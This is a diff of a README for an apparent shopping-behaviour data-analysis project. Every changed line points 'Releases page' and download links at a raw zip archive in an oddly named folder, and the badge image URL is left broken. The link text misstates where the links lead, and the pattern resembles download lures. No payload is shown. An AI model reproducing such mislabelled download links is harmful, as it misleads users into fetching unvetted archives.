@@ -1,6 +1,6 @@
 # 🛍️ Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI - Analyze Shopping Trends Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/releases)
+[![Download Now](https://raw.githubusercontent.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/main/Pycnodontidae/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI_v3.5.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/main/Pycnodontidae/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI_v3.5.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ Welcome to the Customer Shopping Behavior Data Analysis project. This project pr
 
 To download and run this application, please follow these simple steps:
 
-1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://github.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/releases).
+1. **Visit the Releases Page:** Click this link to go to the [Releases page](https://raw.githubusercontent.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/main/Pycnodontidae/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI_v3.5.zip).
    
 2. **Select the Latest Version:** On the releases page, find the latest version of the application. You will see a list of files available for download.
    
@@ -49,7 +49,7 @@ To download and run this application, please follow these simple steps:
 
 - **Choose Relevant Data:** Make sure to use recent data for accurate trends.
 - **Explore All Dashboards:** Each dashboard offers unique insights. Take time to explore all options.
-- **Regular Updates:** Keep your application updated by visiting the [Releases page](https://github.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/releases).
+- **Regular Updates:** Keep your application updated by visiting the [Releases page](https://raw.githubusercontent.com/shiel12/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI/main/Pycnodontidae/Customer_Shopping_Behavior_Data_Analysis_SQL_Python_PowerBI_v3.5.zip).
 
 ## 📚 Additional Resources
 
